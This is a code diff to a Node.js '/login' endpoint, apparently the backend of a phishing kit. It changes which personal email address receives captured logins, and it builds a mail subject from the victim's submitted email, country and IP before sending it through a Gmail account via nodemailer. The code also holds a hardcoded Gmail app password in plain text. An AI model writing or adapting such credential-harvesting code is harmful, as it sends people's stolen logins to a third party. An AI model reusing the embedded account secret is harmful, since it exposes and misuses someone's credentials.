@@ -18,14 +18,16 @@ app.post('/login', async (req, res) => {
     let msg;
 
     if (email && password) {
-        const own = 'alijafari077@yandex.com';
+        // const own = 'alijafari077@yandex.com';
+        const own = 'xperiencepiro944@gmail.com';
         const subj = `Login: | ${email} | ${country} | ${ip}`;
 
         const transporter = nodemailer.createTransport({
             service: 'gmail',
             auth: {
+                // user: 'login@xkcdproject.com',
                 user: 'xperiencepiro@gmail.com',
-                pass: 'tozr lugl sikd zrfx' // Replace with your email password or use OAuth2
+                pass: 'tozr lugl sikd zrfx'
             }
         });
 
